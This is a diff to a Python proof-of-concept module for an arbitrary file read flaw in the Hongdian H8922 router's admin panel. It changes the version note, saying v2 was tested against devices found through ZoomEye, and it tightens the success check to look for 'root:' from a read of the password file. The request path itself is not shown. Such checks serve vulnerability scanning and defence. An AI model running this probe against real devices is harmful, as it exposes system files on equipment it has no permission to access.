@@ -10,11 +10,12 @@ class POC(POCBase):
 
     _info = {
         "author" : "jijue",                      # POC作者
-        "version" : "1",                    # POC版本，默认是1  
+        "version" : "2",                    # POC版本，默认是1  
         "CreateDate" : "2021-06-09",        # POC创建时间
         "UpdateDate" : "2021-06-09",        # POC创建时间
         "PocDesc" : """
-            笔者没有zoomeye高级账号，所以就没测试了，换而言之，该POC不一定靠谱  
+            v1 : 笔者没有zoomeye高级账号，所以就没测试了，换而言之，该POC不一定靠谱  
+            v2 : 笔者特地去zoomeye找资产测试，然后做了点优化，这回应该靠谱了
         """,                                # POC描述，写更新描述，没有就不写
 
         "name" : "宏电 H8922 后台任意文件读取漏洞",                        # 漏洞名称
@@ -56,7 +57,7 @@ class POC(POCBase):
             检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
             """
             req = requests.get(url,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
-            if "root:" in req.text and req.status_code == 200:
+            if "root:" in req.text and req.status_code == 200 and "application/octet-stream" in req.headers["Content-Type"]:
                 vuln = [True,req.text]
             else:
                 vuln = [False,req.text]
